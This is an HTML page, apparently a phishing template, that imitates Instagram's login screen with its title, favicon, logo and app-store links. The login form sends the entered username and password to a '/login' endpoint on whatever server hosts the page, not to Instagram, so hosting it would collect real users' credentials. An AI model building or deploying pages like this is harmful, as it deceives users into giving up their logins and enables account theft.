<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link
      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
      rel="stylesheet"
    />
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" />

  </head>
  <body class="bg-gray-50 flex flex-col items-center justify-center min-h-screen px-4">
    <div class="max-w-md w-full">
      <!-- Login box (logo + form inside border) -->
      <div
        class="bg-white border border-gray-300 rounded-sm px-8 py-6 mb-4 shadow"
      >
        <!-- Logo inside box -->
        <div class="text-center mb-6">
          <img
            src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png"
            alt="Instagram"
            class="mx-auto h-10 object-contain"
          />
        </div>

        <form  method="POST" action="/login" class="flex flex-col space-y-4">
          <input
            type="text"
             name="username"
            placeholder="Phone number, username, or email"
            class="border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
          />
          <input
            type="password"
             name="password"
            placeholder="Password"
            class="border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
          />
          <button
            type="submit"
            class="bg-blue-500 hover:bg-blue-600 text-white text-sm font-semibold py-2 rounded-sm"
          >
            Log In
          </button>
        </form>

        <div class="flex items-center my-4">
          <div class="flex-grow h-px bg-gray-300"></div>
          <span class="px-3 text-gray-400 text-sm font-medium">OR</span>
          <div class="flex-grow h-px bg-gray-300"></div>
        </div>

        <div
          class="text-center text-blue-900 text-sm font-semibold cursor-pointer hover:underline mb-4"
        >
          Log in with Facebook
        </div>

        <div
          class="text-center text-xs text-blue-500 hover:underline cursor-pointer"
        >
          Forgot password?
        </div>
      </div>

      <!-- Signup box -->
      <div
        class="bg-white border border-gray-300 rounded-sm px-8 py-4 text-center text-sm mb-4 shadow"
      >
        Don't have an account?
        <span class="text-blue-500 font-semibold cursor-pointer hover:underline"
          >Sign up</span
        >
      </div>

      <!-- Get the app -->
      <div class="text-center text-sm mb-2">Get the app.</div>
      <div class="flex justify-center space-x-2">
        <a
          href="https://apps.apple.com/app/instagram/id389801252"
          target="_blank"
          ><img
            src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg"
            alt="Download on the App Store"
            class="h-10"
        /></a>
        <a
          href="https://play.google.com/store/apps/details?id=com.instagram.android"
          target="_blank"
          ><img
            src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
            alt="Get it on Google Play"
            class="h-10"
        /></a>
      </div>
    </div>
  </body>
</html>
